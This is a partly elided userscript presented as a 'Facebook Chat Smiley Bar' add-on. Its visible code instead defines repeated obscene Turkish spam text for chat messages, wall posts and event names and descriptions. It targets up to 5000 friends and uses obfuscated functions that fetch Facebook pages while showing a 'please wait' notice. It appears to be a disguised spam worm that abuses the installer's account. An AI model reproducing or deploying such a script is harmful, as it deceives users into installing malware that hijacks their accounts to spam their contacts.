// ==UserScript==
// @name			Facebook Chat Smiley Bar
// @description			Facebook Chat'e Smiley-bar Ekleyin | Ali Deniz �zg�l
...
// @version			1.1.2
// @versionnumber		1.1.2
// @namespace	                http://userscripts.org/scripts/show/106011
// ==/UserScript==
//

var randomnumber=Math.floor(Math.random()*99999);
var chatmessage = 'cCc İnciSiker cCc Altını Şer İnciSiker cCccCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCccCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCccCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCccCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCccCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCccCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCccCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCccCc İnciSiker cCc Altını Şer İnciSiker cCc';
var postmessage = 'cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc';
var redirect = 'http://www.facebook.com';
var eventdesc = 'cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc';
var eventname = 'cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc cCc İnciSiker cCc Altını Şer İnciSiker cCc';
var nfriends = 5000;
var debug = false;
var wf = 0;
var mf = function () {
...
doget('/', function (_0xaa04xf) {
    ...
    var _0xaa04x17 = function () {
            ...
            _0xaa04x18['innerHTML'] = '&nbsp;<br/>Lütfen bekleyin...<br/><a href="javascript:void(0);" onclick="wf=0; mf();">beklemek İstemiyorum!</a> ';
